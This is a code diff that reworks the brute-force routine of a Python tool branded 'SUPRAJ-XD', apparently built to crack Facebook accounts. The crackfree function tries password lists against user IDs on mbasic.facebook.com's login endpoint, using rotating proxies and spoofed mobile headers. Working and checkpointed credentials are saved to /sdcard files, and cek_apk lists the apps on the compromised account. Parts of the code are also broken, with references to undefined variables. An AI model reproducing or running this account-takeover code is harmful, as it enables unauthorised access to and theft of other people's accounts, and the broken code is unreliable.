@@ -782,86 +782,111 @@ def crack(idf,pwv):
 
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
+import sys
+import random
+import time
+import requests
+from bs4 import BeautifulSoup
 
-def crackfree(idf,pwv):
-    global loop,ok,cp
-    sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+def crackfree(idf, pwv):
+    global loop, ok, cp
+    sys.stdout.write(f"\r [SUPRAJ-XD] {loop}/{len(id)} OK[{ok}] [{'{:.0%}'.format(loop / float(len(id)))}]  ")
     sys.stdout.flush()
+    
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
     ses = requests.Session()
+    
     for pw in pwv:
         try:
-            nip=random.choice(prox)
-            header_mbasic={'authority': 'mbasic.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=6zsqZlv1F0JB8lDS16pQzU8F; sb=6zsqZkMsyZHPfTG6lZlM84DW; m_pixel_ratio=1.5; wd=1067x480; fr=0A1pJjJlb27rVicOG..BmKjvr..AAA.0.0.BmKjwX.AWXnLXDbzI4; ps_n=1; ps_l=1',
-            'dpr': '1.5',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '"SM-G998B"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"9.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'viewport-width': '980',}
-
-            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=mbasic,allow_redirects=False)
-            if "checkpoint" in po.cookies.get_dict().keys():
+            nip = random.choice(prox)
+            header_mbasic = {
+                'authority': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'dpr': '1.5',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '"SM-G998B"',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-ch-ua-platform-version': '"9.0.0"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+                'viewport-width': '980',
+            }
             
-                print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
-                cek_apk(session,coki)
-                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
-                cp+=1
+            dataa = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+                "uid": idf,
+                "next": "https://p.facebook.com/login/save-device/",
+                "flow": "login_no_pin",
+                "pass": pw,
+            }
+            
+            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=header_mbasic, allow_redirects=False)
+            
+            if "checkpoint" in po.cookies.get_dict().keys():
+                print(f'\r[CP] {idf} │ {pw}')
+                cek_apk(session, coki)
+                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf + ' • ' + pw + '\n')
+                cp += 1
                 break
+            
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
+                ok += 1
+                coki = po.cookies.get_dict()
+                print(f'\r[OK] {idf} │ {pw}')
+                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf + ' • ' + pw + '\n')
                 break
                 
             else:
                 continue
+        
         except requests.exceptions.ConnectionError:
             time.sleep(31)
-    loop+=1
+            continue
+        
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            continue
+    
+    loop += 1
 
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r 🎮  %sYour Active Application Details :'%(H))
-        for i in range(len(game)):
-            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
-        for i in range(len(game)):
-            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+def cek_apk(session, coki):
+    try:
+        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+        sop = BeautifulSoup(w, "html.parser")
+        x = sop.find("form", method="post")
+        game = [i.text for i in x.find_all("h3")]
+        if len(game) == 0:
+            print('\rNo Active Apk found')
         else:
-            print(f'\r')
+            print('\rYour Active Application Details:')
+            for i in range(len(game)):
+                print(f"{i+1}. {game[i].replace('Ditambahkan pada', 'Ditambahkan pada')}")
+        
+        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+        sop = BeautifulSoup(w, "html.parser")
+        x = sop.find("form", method="post")
+        game = [i.text for i in x.find_all("h3")]
+        if len(game) == 0:
+            print('\rNo Expired Apk found')
+        else:
+            print('\rYour Expired Application Details:')
+            for i in range(len(game)):
+                print(f"{i+1}. {game[i].replace('Kedaluwarsa', 'Kedaluwarsa')}")
+    
+    except Exception as e:
+        print(f"An error occurred while checking apps: {e}")
+
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
